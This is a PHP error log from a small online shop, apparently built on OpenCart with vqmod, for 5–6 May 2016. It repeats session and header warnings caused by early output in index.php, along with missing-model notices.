2016-05-05 11:38:38 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 11:38:38 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 11:38:38 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 11:38:38 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 12:10:37 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 12:10:37 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 12:10:37 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 12:10:37 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 12:10:37 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 13:19:13 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 13:19:14 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 13:19:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-05 13:19:14 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-05 14:27:39 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 14:27:39 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 14:27:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 14:27:39 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 14:27:39 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 15:32:17 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 15:32:17 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 15:32:17 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 17:29:52 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 17:29:52 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 17:29:52 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 17:29:52 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 17:29:52 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 17:39:32 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 17:39:32 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 17:39:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 17:39:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 17:39:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-05 17:39:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-05 19:40:48 - 
2016-05-05 19:40:48 - 
2016-05-05 19:40:48 - 
2016-05-05 19:40:48 - 
2016-05-05 19:40:48 - 
2016-05-05 20:08:12 - 
2016-05-05 20:08:12 - 
2016-05-05 20:08:12 - 
2016-05-05 20:08:12 - 
2016-05-05 20:08:12 - 
2016-05-05 21:56:24 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 21:56:24 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 21:56:24 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 21:56:24 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 21:56:24 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 22:49:34 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 22:49:34 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 22:49:34 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 22:49:34 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 22:49:34 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-05 22:49:34 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-05 22:54:19 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 22:54:19 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 22:54:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 22:54:19 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 22:54:19 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 23:36:41 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 23:36:41 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 23:36:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 23:36:41 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 23:36:41 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-05 23:37:05 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 23:37:05 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-05 23:37:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-05 23:37:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-05 23:37:05 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 2:52:13 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 2:52:13 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 2:52:13 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 2:52:13 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 2:52:13 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 3:48:18 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 3:48:18 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 3:48:18 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 3:48:18 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 3:48:18 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 3:54:30 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 3:54:30 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 3:54:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 3:54:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 3:54:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 28
2016-05-06 3:54:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_controller.php on line 29
2016-05-06 4:34:04 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 4:34:04 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 4:34:04 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 5:59:57 - 
2016-05-06 5:59:57 - 
2016-05-06 5:59:57 - 
2016-05-06 5:59:57 - 
2016-05-06 5:59:57 - 
2016-05-06 7:24:53 - 
2016-05-06 7:24:53 - 
2016-05-06 7:24:53 - 
2016-05-06 7:24:53 - 
2016-05-06 7:24:53 - 
2016-05-06 8:55:05 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 8:55:05 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 8:55:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 8:55:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 8:55:05 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 10:49:30 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 10:49:30 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 10:49:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 10:49:30 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 10:49:30 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 11:37:05 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 11:37:05 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 11:37:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 11:37:05 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 11:37:05 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 13:02:29 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 13:02:29 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 13:02:29 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 13:02:29 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 13:02:29 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 13:17:53 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 13:17:53 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 13:17:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 13:17:53 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 13:17:53 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 15:06:16 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:06:16 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:06:16 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 15:06:16 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 15:06:16 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 15:07:04 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:07:04 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:07:04 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 15:07:04 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 15:07:04 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 15:09:32 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:09:32 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:09:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 15:09:32 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 15:09:32 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 15:20:47 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:20:47 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 15:20:47 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 15:20:47 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 15:20:47 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 16:43:36 - 
2016-05-06 16:43:36 - 
2016-05-06 16:43:36 - 
2016-05-06 16:43:36 - 
2016-05-06 16:43:36 - 
2016-05-06 17:44:24 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:44:24 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:44:24 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/admin/index.php:51) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:06 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:06 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:06 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:06 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:06 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:06 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:06 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:07 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:07 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:07 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:07 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:07 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:10 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:10 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:10 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:10 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:11 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:11 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:11 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:11 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  session_start(): Cannot send session cache limiter - headers already sent (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/index.php on line 179
2016-05-06 17:46:11 - PHP Warning:  Cannot modify header information - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/currency.php on line 45
2016-05-06 17:46:12 - PHP Notice:  Error: Could not load model tool/image! in /home2/goldglas/public_html/vqmod/vqcache/vq2-system_engine_loader.php on line 48
2016-05-06 17:46:12 - PHP Warning:  session_start(): Cannot send session cookie - headers already sent by (output started at /home2/goldglas/public_html/index.php:67) in /home2/goldglas/public_html/system/library/session.php on line 12
